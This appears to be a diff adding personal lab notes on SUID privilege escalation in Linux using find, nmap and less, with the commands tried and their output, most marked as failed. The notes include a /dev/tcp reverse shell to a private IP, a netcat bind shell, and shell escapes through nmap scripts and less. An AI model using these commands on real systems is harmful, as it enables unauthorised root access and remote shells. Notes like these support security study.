@@ -1,0 +1,70 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  SUID ABUSE WITH FIND, NMAP, LESS - ESCALATE TO ROOT
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-10[Aug-Mon]13-17PM 
+
+##https://gracefulsecurity.com/linux-privesc-abusing-suid/
+##https://null-byte.wonderhowto.com/how-to/find-exploit-suid-binaries-with-suid3num-0215789/
+##https://pentestlab.blog/2017/09/25/suid-executables/
+
+==
+FIND
+==
+
+which find
+/bin/find
+
+sudo chmod u+s /bin/find
+
+touch foo
+
+find foo -exec whoami \;
+root
+
+find foo -exec id \;
+uid=1001(j) gid=1001(j) euid=0(root) groups=1001(j)
+
+find foo -exec bash -i >& /dev/tcp/172.16.0.105/9001 0>&1 \;
+bash-4.2$ whoami
+j
+
+==
+FIND + NETCAT BIND
+==
+
+find foo -exec /usr/bin/nc -lvp 9001 -e /bin/sh \;
+
+DIDNT WORK, STILL j
+
+==
+NMAP
+==
+
+which nmap
+
+sudo chmod u+s /usr/bin/nmap
+
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+/usr/bin/nmap localhost --script=$TF
+
+DIDNT WORK, STILL j
+
+nmap --interactive
+!sh
+whoami
+
+DIDNT WORK, NO --interactive OPTION
+
+==
+LESS
+==
+
+sudo chmod u+s /usr/bin/less
+
+less foo
+!/bin/sh
+
+DIDNT WORK, STILL j
